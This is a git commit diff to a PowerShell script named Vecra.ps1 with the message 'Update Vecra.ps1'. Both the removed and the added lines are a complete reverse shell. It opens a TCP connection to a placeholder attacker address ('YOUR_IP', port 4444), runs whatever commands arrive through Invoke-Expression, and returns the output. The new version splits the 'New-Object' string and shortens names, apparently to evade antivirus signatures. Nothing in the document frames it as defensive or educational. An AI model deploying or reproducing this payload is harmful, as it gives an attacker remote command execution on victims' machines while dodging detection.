0a856c68cd241ba7e9c040f92663b74f1d6af19e
JiriWeiss <75065909+JiriWeiss@users.noreply.github.com>
2025-05-12 13:47:19 +0200

    Update Vecra.ps1

--- Vecra.ps1
+++ Vecra.ps1
@@ -1,12 +1,11 @@
-$client = New-Object System.Net.Sockets.TCPClient("YOUR_IP",4444);
-$stream = $client.GetStream();
-[byte[]]$bytes = 0..65535|%{0};
-while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
-  $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
-  $sendback = (iex $data 2>&1 | Out-String );
-  $sendback2 = $sendback + "PS " + (pwd).Path + "> ";
-  $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
-  $stream.Write($sendbyte,0,$sendbyte.Length);
-  $stream.Flush()
-};
-$client.Close()
+$C = ('N'+'ew-Object') ('System.Net.Sockets.TCPClient') ('YOUR_IP',4444);
+$s = $C.GetStream();
+$b = 0..65535|%{0};
+while(($i = $s.Read($b,0,$b.Length)) -ne 0){
+$d = ([Text.Encoding]::ASCII).GetString($b,0,$i);
+$r = (Invoke-Expression $d 2>&1 | Out-String);
+$r2 = $r + 'PS ' + (Get-Location).Path + '> ';
+$sb = ([Text.Encoding]::ASCII).GetBytes($r2);
+$s.Write($sb,0,$sb.Length)
+;$s.Flush()};
+$C.Close()
